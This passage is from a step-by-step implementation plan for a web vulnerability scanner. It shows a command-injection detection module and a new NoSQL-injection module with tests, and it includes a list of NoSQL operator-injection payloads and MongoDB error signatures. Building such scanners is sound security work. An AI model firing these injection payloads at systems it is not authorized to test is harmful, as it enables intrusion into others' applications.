class CmdiGenerator(PayloadGenerator):
    def __init__(self, templates=None):
        self._templates = list(templates) if templates is not None else list(CMDI_TEMPLATES)

    def generate(self, point, request):
        for tmpl in self._templates:
            m = marker("cmdi")
            value = tmpl.format(m=m)
            yield TestCase(
                point=point,
                payload=Payload(value, technique="cmdi", meta={"marker": m}),
                attack_type=AttackType.CMDI,
            )


class CmdiValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = (
            list(signatures) if signatures is not None else list(GENERIC_ERROR_SIGNATURES)
        )

    def evaluate(self, test_case, response, baseline=None):
        m = test_case.payload.meta.get("marker")
        text = body_text(response)
        # execution: the marker appears but NOT as part of the echoed literal payload
        if m and m in text and test_case.payload.value not in text:
            return Finding(
                AttackType.CMDI, test_case.point, test_case.payload, Confidence.HIGH,
                f"command output reflected (marker {m})",
                request=test_case.request, response=response,
            )
        err = error_signature(response, baseline, self._signatures)
        if err is not None:
            return Finding(
                AttackType.CMDI, test_case.point, test_case.payload, Confidence.MEDIUM,
                f"error signature: {err.group(0)[:80]}",
                request=test_case.request, response=response,
            )
        return None


CMDI_MODULE = AttackModule(
    "cmdi",
    CmdiGenerator(),
    CmdiValidator(),
    attack_type=AttackType.CMDI,
    applies_to=("param", "form", "json", "multipart"),
    description="OS command injection (output-reflection oracle)",
)
```

- [ ] **Step 4: Add `CommandInjectionRule`** to `rules.py` + `DEFAULT_RULES`:
```python
class CommandInjectionRule(ClassificationRule):
    name = "command-injection"

    def match(self, point) -> set:
        if point.kind in _BODY_KINDS and not is_empty(point.value):
            return {AttackType.CMDI}
        return set()
```

- [ ] **Step 5: Register** `CMDI_MODULE` (+ constants/classes); add to `BUILTIN_MODULES`.

- [ ] **Step 6: End-to-end Runner test** — like Task 4: a `FakeSender` callable that echoes the `cmdi_*` marker (bare) from the request into the body; assert `report.findings`.

- [ ] **Step 7: Run + lint + commit** (`feat(attack): generic command-injection module`).

---

### Task 7: nosqli module + full-suite gate

**Files:** Create `penpine/attack/modules/nosqli.py`; modify `rules.py`, `modules/__init__.py`; test `tests/attack/modules/test_nosqli.py`, `tests/attack/modules/test_registration.py`.

**Interfaces:** `NOSQLI_PAYLOADS`, `NOSQLI_SIGNATURES`, `NosqliGenerator`, `NosqliValidator`, `NOSQLI_MODULE`; `NoSqlRule` in `DEFAULT_RULES`; registered.

- [ ] **Step 1: Write the failing test**

```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.nosqli import NosqliGenerator, NosqliValidator
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="admin"):
    return InjectionPoint("param:user", "param", "user", value)


def resp(body, status=200):
    line = b"200 OK" if status == 200 else b"500 Internal Server Error"
    return parse_response(b"HTTP/1.1 " + line + b"\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_yields_operator_payloads():
    tcs = list(NosqliGenerator().generate(pt(), None))
    assert tcs and all(c.attack_type == AttackType.NOSQLI for c in tcs)
    assert any("$ne" in c.payload.value for c in tcs)


def test_validator_detects_nosql_error_high():
    tc = next(iter(NosqliGenerator().generate(pt(), None)))
    f = NosqliValidator().evaluate(tc, resp(b"MongoError: E11000 duplicate key"), baseline=resp(b"ok"))
    assert f is not None and f.confidence.name == "HIGH" and f.attack_type == AttackType.NOSQLI


def test_validator_flags_status_change_medium():
    tc = next(iter(NosqliGenerator().generate(pt(), None)))
    f = NosqliValidator().evaluate(tc, resp(b"boom", status=500), baseline=resp(b"ok"))
    assert f is not None and f.confidence.name == "MEDIUM"


def test_validator_benign_returns_none():
    tc = next(iter(NosqliGenerator().generate(pt(), None)))
    assert NosqliValidator().evaluate(tc, resp(b"ok"), baseline=resp(b"ok")) is None
```

- [ ] **Step 2: Run** → FAIL.

- [ ] **Step 3: Create `penpine/attack/modules/nosqli.py`**

```python
"""Generic NoSQL (operator) injection."""

from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, error_signature, search_signatures
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

NOSQLI_PAYLOADS = [
    "[$ne]=", "[$gt]=", '{"$ne":null}', '{"$gt":""}', "';return true;var x='",
    "' || '1'=='1", '", $where: "1==1', "[$regex]=.*",
]

NOSQLI_SIGNATURES = [
    re.compile(p, re.I)
    for p in [r"MongoError", r"E11000", r"\$where", r"\bBSON\b", r"MongoServerError", r"CastError"]
]


def _status(obj) -> int:
    return getattr(obj, "status_code", 0) or 0


def _blen(obj) -> int:
    return len(getattr(obj, "body", b"") or b"")


class NosqliGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(NOSQLI_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(
                point=point, payload=Payload(value, technique="nosqli"), attack_type=AttackType.NOSQLI
            )


class NosqliValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = list(signatures) if signatures is not None else list(NOSQLI_SIGNATURES)

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is not None:
            if baseline is not None and search_signatures(body_text(baseline), self._signatures):
                return None
            return Finding(
                AttackType.NOSQLI, test_case.point, test_case.payload, Confidence.HIGH,
                f"NoSQL error signature: {match.group(0)[:80]}",
                request=test_case.request, response=response,
            )
        if baseline is not None:
            bs, rs = _status(baseline), _status(response)
            if rs >= 400 and rs // 100 != bs // 100:
                return Finding(
                    AttackType.NOSQLI, test_case.point, test_case.payload, Confidence.MEDIUM,
                    f"status change {bs} -> {rs}", request=test_case.request, response=response,
                )
            bl, rl = _blen(baseline), _blen(response)
            if bl and (rl >= 3 * bl or rl * 3 <= bl):
                return Finding(
                    AttackType.NOSQLI, test_case.point, test_case.payload, Confidence.MEDIUM,
                    f"response size {bl} -> {rl} bytes", request=test_case.request, response=response,
                )
        return None


NOSQLI_MODULE = AttackModule(
    "nosqli",
    NosqliGenerator(),
    NosqliValidator(),
    attack_type=AttackType.NOSQLI,
    applies_to=("param", "form", "json"),
    description="NoSQL operator injection",
)
```
(Remove the unused `error_signature` import if ruff flags F401 — this validator uses `search_signatures` directly for the baseline-suppression, matching sqli.)

- [ ] **Step 4: Add `NoSqlRule`** to `rules.py` + `DEFAULT_RULES`:
```python
class NoSqlRule(ClassificationRule):
    name = "nosql"

    def match(self, point) -> set:
        return {AttackType.NOSQLI} if point.kind in {"param", "form", "json"} else set()
```

- [ ] **Step 5: Register** `NOSQLI_MODULE` (+ constants/classes); add to `BUILTIN_MODULES`.

- [ ] **Step 6: Registration + full-suite test**

Add to `tests/attack/modules/test_registration.py` (or create it): after `register_builtins()`, assert all six new modules are registered by name:
```python
def test_all_generic_modules_registered():
    from penpine.attack import registry
    from penpine.attack.modules import register_builtins

    registry.clear()
    register_builtins()
    try:
        for name in ("fuzz", "ssti", "crlf", "ssrf", "cmdi", "nosqli"):
            assert registry.get(name) is not None
    finally:
        registry.clear()
```
(Match the actual registry accessor — check `penpine/attack/registry.py` for the lookup function name, e.g. `registry.get(name)` or `by_name`; use whatever the existing `test_registration.py` uses.)

- [ ] **Step 7: Full suite + gates + commit**

Run: `pytest -q && ruff check . && ruff format --check .`
Expected: all pass; ruff clean.
```bash
git add penpine/attack/modules/nosqli.py penpine/attack/analyze/rules.py penpine/attack/modules/__init__.py tests/attack/modules/test_nosqli.py tests/attack/modules/test_registration.py
git commit --no-gpg-sign -m "feat(attack): generic NoSQL-injection module; register all six generic modules

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Self-Review Notes

- **Spec coverage:** types + `_common` (Component 1) → Task 1; fuzz/ssti/crlf/ssrf/cmdi/nosqli (Component 2) → Tasks 2-7; analyzer rules (Component 3) → the per-module Step 4 (ssrf reuses existing); registration (Component 4) → each module's Step 5 + Task 7 registration test. Testing spec → each task's unit + e2e tests.
- **Pattern consistency:** every module mirrors `sqli.py` — extendable constants, `payloads=None`/`signatures=None` ctors, `Finding(...)` shape, baseline suppression. Confidence tiers per the spec table.
- **Oracle correctness:** ssti/cmdi/crlf use a fresh random product/marker per test case (unambiguous positive); fuzz/nosqli/ssrf compare against baseline and suppress baseline-present signals.
- **E2e caveat:** ssti's true-positive needs the exact random product reflected, which a static `FakeSender` can't produce — so ssti's e2e asserts the run completes with `sent > 0` (true-positive is covered by the validator unit test); crlf/cmdi/fuzz/ssrf/nosqli e2e use a `FakeSender` that returns a crafted true-positive response and assert `report.findings`.
- **Registry accessor:** Task 7 Step 6 notes to match the existing `test_registration.py` lookup (`registry.get` vs `by_name`) — the implementer confirms the real name before writing the assertion.
- **Rule ordering:** each new rule is appended to `DEFAULT_RULES`; order does not matter (the analyzer unions all rule tags).
